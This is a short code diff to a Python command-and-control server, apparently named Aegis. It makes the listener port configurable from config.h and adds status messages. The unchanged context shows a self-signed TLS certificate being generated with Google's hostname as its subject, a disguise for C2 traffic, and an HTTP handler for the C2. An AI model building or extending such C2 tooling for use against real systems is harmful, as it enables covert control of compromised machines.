@@ -133,6 +133,8 @@ def run_server(port=443):
     if not os.path.exists("server.pem"):
         os.system("openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj '/CN=www.google.com'")
 
+    print(f"{Colors.GREEN}[+] Starting C2 Server on port {port}...{Colors.ENDC}")
+
     server_address = ('0.0.0.0', port)
     httpd = http.server.HTTPServer(server_address, AegisC2Handler)
 
@@ -304,8 +306,12 @@ def menu_interact():
 def main_loop():
     global SERVER_RUNNING
 
+    # Get configured port from config.h
+    port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
+    c2_port = int(port_str) if port_str and port_str.isdigit() else 4443
+
     # Auto-start listener thread
-    t = threading.Thread(target=run_server, args=(4443,))
+    t = threading.Thread(target=run_server, args=(c2_port,))
     t.daemon = True
     t.start()
 
@@ -327,7 +333,7 @@ def main_loop():
         elif choice == '4':
             menu_advanced_config()
         elif choice == '5':
-            print("Listener is already running on port 4443 (mock).")
+            print(f"Listener is already running on port {c2_port} (background).")
             time.sleep(1)
         elif choice == '0':
             SERVER_RUNNING = False
